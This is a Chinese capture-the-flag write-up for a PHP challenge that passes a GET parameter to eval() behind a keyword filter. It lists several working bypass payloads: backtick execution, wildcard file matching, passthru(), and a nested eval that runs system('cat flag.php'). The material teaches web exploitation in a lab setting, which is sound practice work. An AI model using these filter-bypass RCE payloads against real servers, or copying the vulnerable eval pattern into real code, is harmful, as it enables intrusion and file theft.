```
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:42:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

源码分析

get方式传参c

过滤

flag

system

php

 

eval命令执行



利用 ` 

反字节符配合echo



```
?s=echo(`ls`);
```

![image-20250309094552644](./assets/image-20250309094552644.png)



利用*匹配

```
?c=echo(`cat fla*`);
```

![image-20250309094611868](./assets/image-20250309094611868.png)



利用?匹配

```
?c=echo(`cat ????.???`);
```

![image-20250401223917882](./assets/image-20250401223917882.png)



利用passthru函数也行

```
?c=passthru("cat ????.???");
```

![image-20250401224022512](./assets/image-20250401224022512.png)



拼接一个eval进行rce

```
?c=eval($_GET['ra1n3']);&ra1n3=system("cat flag.php");
```

![image-20250401224456479](./assets/image-20250401224456479.png)